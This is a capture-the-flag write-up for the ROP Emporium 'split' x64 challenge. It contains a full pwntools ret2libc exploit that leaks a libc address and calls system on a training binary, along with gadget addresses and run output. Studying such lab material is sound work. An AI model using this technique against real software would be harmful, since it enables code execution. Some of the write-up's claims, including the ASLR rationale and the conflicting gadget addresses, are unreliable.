---
title: ROP Emporium - split Challenge Writeup
tags: [pwn, rop, binary exploitation, x64]
style: border
color: info
description: Writeup for the split challenge from ROP Emporium - learning to pass arguments to functions using ROP gadgets.
---

## Challenge Overview

The **split** challenge introduces the concept of passing arguments to functions in x64 ROP chains. Unlike ret2win where we simply redirected execution, here we need to call a function with a specific argument.

**Challenge Link**: [ROP Emporium - split](https://ropemporium.com/challenge/split.html)

## Binary Analysis

### Initial Reconnaissance

```bash
$ file split
split: ELF 64-bit LSB executable, x86-64

$ checksec split
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Same protections as ret2win - no stack canary and no PIE, but NX is enabled.

### Static Analysis

```bash
$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> test
Thank you!
Exiting
```

Examining the binary with a disassembler reveals:

1. **pwnme()**: Contains the buffer overflow vulnerability
2. **usefulFunction()**: Calls `system("/bin/ls")` 
3. **usefulString**: Contains the string `/bin/cat flag.txt` somewhere in the binary

The goal is to call `system("/bin/cat flag.txt")` instead of `system("/bin/ls")`.

### Finding Important Addresses

```bash
# Find system() call
$ r2 split
[0x00400650]> aaa
[0x00400650]> afl | grep useful
0x00400742    1 17           usefulFunction

# Find the useful string
[0x00400650]> iz | grep bin
vaddr=0x00601060 paddr=0x00001060 ordinal=004 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt

# Find system PLT
[0x00400650]> afl | grep system
0x00400560    1 6            sym.imp.system
```

Key addresses:
- `system@plt`: `0x400560` (not used in our approach)
- `/bin/cat flag.txt`: `0x601060`
- `puts@plt`: `0x400550`
- `puts@got`: `0x601018`
- `main`: `0x400697`
- System offset from puts (libc-specific): `0x32190`

## x64 Calling Convention

In x64 Linux, the first six function arguments are passed in registers:
1. RDI
2. RSI
3. RDX
4. RCX
5. R8
6. R9

To call `system("/bin/cat flag.txt")`, we need to:
1. Set RDI to point to `/bin/cat flag.txt`
2. Call `system@plt`

### Finding ROP Gadgets

We need a gadget to pop a value into RDI:

```bash
$ ROPgadget --binary split | grep "pop rdi"
0x00000000004007c3 : pop rdi ; ret
```

Perfect! We have a `pop rdi; ret` gadget at `0x4007c3`.

## Exploitation Strategy

This exploit uses a **ret2libc** technique with a libc leak. Instead of directly calling `system@plt` (which might fail due to ASLR in some environments), we:

1. **First ROP chain**: Leak a libc address by calling `puts` with the GOT entry of `puts` itself
2. **Return to main**: Loop back to get another input
3. **Calculate libc base**: Use the leaked address to calculate the real address of `system`
4. **Second ROP chain**: Call the real `system` with `/bin/cat flag.txt` as argument

This technique is more robust and demonstrates real-world exploitation where ASLR might be enabled.

The ROP chains look like:

**First chain (leak libc)**:
```
[padding]
[pop rdi; ret]
[puts@got]
[puts@plt]
[main]
```

**Second chain (call system)**:
```
[padding]
[ret]  # Stack alignment
[pop rdi; ret]
[address of "/bin/cat flag.txt"]
[system from libc]
```

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *
import sys

elf = ELF("./split")
context.binary = elf
binary = elf.path
context.log_level = "debug"
IP, PORT = "address", 1337

global io
breakpoints = '''
'''

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
else:
    io = process(binary)
    gdb.attach(io, breakpoints)

sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
def main(io):
    # start pwn :)
    ret = 0x000000000040053e
    main = 0x0000000000400697
    cat_flag = 0x00601060
    pop_rdi = 0x00000000004007c3
    puts_plt = 0x400550
    puts_got_plt = 0x601018
    system_off = 0x32190

    payload = b'a' * 32
    payload += b'b' * 8          #rbp
    payload += p64(pop_rdi)
    payload += p64(puts_got_plt)
    payload += p64(puts_plt)
    payload += p64(main)
    sla('> ', payload)

    tmp = reu('you!\n')
    leak = re(6)
    leak = leak + b'\x00\x00'
    leak = u64(leak)
    log.info('leak @ ' + hex(leak))
    system = leak - system_off
    log.info('system @ ' + hex(system))
    
    payload = b''
    payload += b'a' * 32
    payload += b'b' * 8          #rbp
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(cat_flag)
    payload += p64(system)
    sl(payload)

    io.interactive()

if __name__ == "__main__":
    main(io)
```

## Understanding the Leak

The exploit leaks the runtime address of `puts` from the GOT (Global Offset Table):

1. The GOT contains actual addresses of library functions resolved at runtime
2. By calling `puts(puts@got)`, we print the address where `puts` is loaded
3. We can then calculate: `libc_base = leaked_puts - offset_of_puts_in_libc`
4. Finally: `system = libc_base + offset_of_system_in_libc`

In this exploit, we use a precomputed offset (`0x32190`) which is the distance between puts and system in a specific libc version. In a real scenario, you would:
- Identify the libc version using leaked addresses
- Look up or calculate the correct offsets
- Or use tools like `libc-database` to automatically identify the version

## Running the Exploit

```bash
$ python3 exploit_split.py
[*] '/path/to/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/path/to/split': pid 12345
[*] leak @ 0x7f1234567890
[*] system @ 0x7f1234535700
[*] Receiving all data

Thank you!
ROPE{a_placeholder_32byte_flag!}
```

## Stack Alignment Issue (Optional)

In some environments, you might encounter a segmentation fault due to stack alignment requirements. Modern `system()` implementations require the stack to be 16-byte aligned before the call.

If you encounter this issue, add an extra `ret` gadget before calling system:

```python
ret_gadget = 0x400616  # Simple ret instruction

payload = flat(
    b'A' * offset,
    pop_rdi,
    bin_cat_flag,
    ret_gadget,     # Align stack
    system_plt
)
```

## Key Takeaways

1. **x64 Calling Convention**: Understanding that arguments are passed in registers (RDI for first argument)
2. **ROP Gadgets**: Using `pop rdi; ret` to control register values
3. **Chaining Gadgets**: Building a ROP chain to set up function arguments
4. **PLT Usage**: Calling imported functions via the Procedure Linkage Table
5. **String Addresses**: Finding and using strings embedded in the binary

This challenge demonstrates the core concept of ROP - chaining small code snippets (gadgets) to perform complex operations.

---

**Challenge Completed**: ✓  
**Previous Challenge**: [ret2win](https://ropemporium.com/challenge/ret2win.html)  
**Next Challenge**: [callme](https://ropemporium.com/challenge/callme.html)
